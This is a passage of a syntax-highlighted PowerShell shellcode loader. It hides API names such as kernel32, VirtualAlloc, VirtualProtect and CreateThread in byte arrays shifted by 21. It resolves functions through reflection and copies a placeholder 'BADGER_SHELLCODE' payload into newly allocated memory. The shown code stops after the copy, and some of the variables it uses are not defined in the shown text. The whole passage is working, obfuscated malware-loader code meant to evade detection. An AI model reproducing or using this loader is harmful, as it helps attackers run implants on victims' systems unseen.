<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$Reo5o</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x3d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x59</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x58</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x38</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x59</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x52</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$Reib3</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x3d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x39</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x58</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x33</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x64</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x52</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4e</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$Thah8</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x3b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x33</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x64</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x52</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x39</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x62</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x41</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$ii5Ie</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x34</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x59</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x61</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x56</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$KooG5</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x38</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x51</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x19</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x42</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x59</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x1e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x1d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x19</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x40</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x59</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x51</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x39</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x61</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x38</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x53</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$io9iH</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x32</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$Qui5i</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x32</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x38</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x33</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x59</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$xee2N</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x56</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x59</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x1e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x1d</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$AD0Pi</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x41</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4e</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$ahb3O</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x41</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$yhe4c</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x2E</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5D</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4C</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5F</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3F</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x53</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5D</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4C</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4F</span><span style="color: #ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Get-Robf</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">$b3tz</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">$aisN</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">System.Byte</span><span style="color: #ABB2BF">[]]::new(</span><span style="color: #E06C75">$b3tz.Count</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">$x</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">$x</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-lt</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$aisN.Count</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">$x</span><span style="color: #56B6C2">++</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"><span style="color: #ABB2BF">       </span><span style="color: #E06C75">$aisN</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$x</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">$b3tz</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$x</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">21</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">    }</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">System.Text.Encoding</span><span style="color: #ABB2BF">]::ASCII.GetString(</span><span style="color: #E06C75">$aisN</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span>
<span class="line"><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Get-PA</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">$vmod</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$vproc</span><span style="color: #ABB2BF">) {</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">$a</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> ([</span><span style="color: #C678DD">AppDomain</span><span style="color: #ABB2BF">]::CurrentDomain.GetAssemblies() | </span><span style="color: #56B6C2">Where-Object</span><span style="color: #ABB2BF"> { $_</span><span style="color: #E06C75">.GlobalAssemblyCache</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-And</span><span style="color: #ABB2BF"> $_</span><span style="color: #E06C75">.Location.Split</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;\\\\&#39;</span><span style="color: #ABB2BF">)[</span><span style="color: #D19A66">-1</span><span style="color: #ABB2BF">].Equals(</span><span style="color: #98C379">&#39;System.dll&#39;</span><span style="color: #ABB2BF">) }).GetType((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$KooG5</span><span style="color: #ABB2BF">))</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">$a.GetMethod</span><span style="color: #ABB2BF">((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$io9iH</span><span style="color: #ABB2BF">), [</span><span style="color: #C678DD">reflection.bindingflags</span><span style="color: #ABB2BF">] </span><span style="color: #98C379">&quot;Public,Static&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">System.Reflection.CallingConventions</span><span style="color: #ABB2BF">]::Any, </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">((</span><span style="color: #56B6C2">New-Object</span><span style="color: #ABB2BF"> System.Runtime.InteropServices.HandleRef).GetType(), [</span><span style="color: #C678DD">string</span><span style="color: #ABB2BF">]), </span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">)).Invoke(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">([</span><span style="color: #C678DD">System.Runtime.InteropServices.HandleRef</span><span style="color: #ABB2BF">](</span><span style="color: #56B6C2">New-Object</span><span style="color: #ABB2BF"> System.Runtime.InteropServices.HandleRef((</span><span style="color: #56B6C2">New-Object</span><span style="color: #ABB2BF"> IntPtr), (</span><span style="color: #E06C75">$a.GetMethod</span><span style="color: #ABB2BF">((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$Qui5i</span><span style="color: #ABB2BF">))).Invoke(</span><span style="color: #D19A66">$null</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$vmod</span><span style="color: #ABB2BF">)))), </span><span style="color: #E06C75">$vproc</span><span style="color: #ABB2BF">))</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span>
<span class="line"><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Get-TDef</span><span style="color: #ABB2BF"> {</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">Param</span><span style="color: #ABB2BF"> (</span></span>
<span class="line"><span style="color: #ABB2BF">        [</span><span style="color: #56B6C2">Parameter</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75; font-style: italic">Position</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75; font-style: italic">Mandatory</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">$True</span><span style="color: #ABB2BF">)] [</span><span style="color: #C678DD">Type</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$var_parameters</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">        [</span><span style="color: #56B6C2">Parameter</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75; font-style: italic">Position</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">)] [</span><span style="color: #C678DD">Type</span><span style="color: #ABB2BF">] </span><span style="color: #E06C75">$var_return_type</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">Void</span><span style="color: #ABB2BF">]</span></span>
<span class="line"><span style="color: #ABB2BF">    )</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">$vtdef</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">AppDomain</span><span style="color: #ABB2BF">]::CurrentDomain.DefineDynamicAssembly((</span><span style="color: #56B6C2">New-Object</span><span style="color: #ABB2BF"> System.Reflection.AssemblyName((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$Ait1m</span><span style="color: #ABB2BF">))), [</span><span style="color: #C678DD">System.Reflection.Emit.AssemblyBuilderAccess</span><span style="color: #ABB2BF">]::Run).DefineDynamicModule((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF">  </span><span style="color: #E06C75">$ahv3I</span><span style="color: #ABB2BF">), </span><span style="color: #D19A66">$false</span><span style="color: #ABB2BF">).DefineType((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$Moo5y</span><span style="color: #ABB2BF">), (</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$ooR5o</span><span style="color: #ABB2BF">), [</span><span style="color: #C678DD">System.MulticastDelegate</span><span style="color: #ABB2BF">])</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">$vtdef.DefineConstructor</span><span style="color: #ABB2BF">((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$Reib3</span><span style="color: #ABB2BF">), [</span><span style="color: #C678DD">System.Reflection.CallingConventions</span><span style="color: #ABB2BF">]::Standard, </span><span style="color: #E06C75">$var_parameters</span><span style="color: #ABB2BF">).SetImplementationFlags((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$Reo5o</span><span style="color: #ABB2BF">))</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">$vtdef.DefineMethod</span><span style="color: #ABB2BF">((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$ii5Ie</span><span style="color: #ABB2BF">), (</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$Thah8</span><span style="color: #ABB2BF">), </span><span style="color: #E06C75">$var_return_type</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$var_parameters</span><span style="color: #ABB2BF">).SetImplementationFlags((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$Reo5o</span><span style="color: #ABB2BF">))</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$vtdef.CreateType</span><span style="color: #ABB2BF">()</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]]</span><span style="color: #E06C75">$vopcode</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(BADGER_SHELLCODE)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #E06C75">$vbuf</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> ([</span><span style="color: #C678DD">System.Runtime.InteropServices.Marshal</span><span style="color: #ABB2BF">]::GetDelegateForFunctionPointer((</span><span style="color: #56B6C2">Get-PA</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$xee2N</span><span style="color: #ABB2BF">) (</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$AD0Pi</span><span style="color: #ABB2BF">)), (</span><span style="color: #56B6C2">Get-TDef</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">([</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">]) ([</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">])))).Invoke([</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">]::Zero, </span><span style="color: #E06C75">$vopcode.Length</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3000</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x04</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">System.Runtime.InteropServices.Marshal</span><span style="color: #ABB2BF">]::Copy(</span><span style="color: #E06C75">$vopcode</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$vbuf</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$vopcode.length</span><span style="color: #ABB2BF">)</span></span>
